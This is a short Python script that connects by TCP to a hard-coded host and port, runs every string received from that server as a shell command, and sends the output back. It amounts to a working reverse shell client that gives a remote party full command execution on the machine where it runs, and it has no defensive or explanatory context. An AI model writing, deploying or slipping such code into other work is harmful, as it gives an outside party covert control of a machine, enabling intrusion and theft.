import socket
import subprocess

def start_client(host='192.168.1.20', port=12345):
    # Create a TCP socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to the server
    client_socket.connect((host, port))
    print(f"Connected to server at {host}:{port}")

    try:
        while True:
            # Receive command from the server
            command = client_socket.recv(1024).decode()
            if command.lower() == 'exit':
                break
            
            # Execute the command and get the output
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            client_socket.send(output.stdout.encode() if output.stdout else output.stderr.encode())
    except KeyboardInterrupt:
        print("Client shutting down.")
    finally:
        client_socket.close()

if __name__ == "__main__":
    start_client()